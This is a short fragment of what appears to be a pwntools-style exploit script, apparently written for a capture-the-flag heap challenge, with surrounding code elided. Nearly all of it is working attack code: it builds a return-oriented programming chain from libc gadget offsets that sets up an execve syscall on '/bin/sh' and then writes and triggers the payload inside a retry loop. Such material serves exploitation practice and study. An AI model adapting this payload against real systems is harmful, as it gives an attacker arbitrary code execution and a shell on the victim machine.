...
for _ in range(10): 
    ...
    try: 
        ...
        rax = 0x00000000000e6327+libc.address 
        rsi = 0x000000000005c207+libc.address 
        rdx = 0x0000000000048c92+libc.address 
        syscall = 0x00000000000a0a36+libc.address 
        pay = p64(rdi+1)*(0x20-9)+p64(rdi)+p64(next(libc.search(b'/bin/sh\x00')))+p64(rax)+p64(0x3b)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(syscall) 
        edit(7,pay) 
        copy(7,11,0x100) 
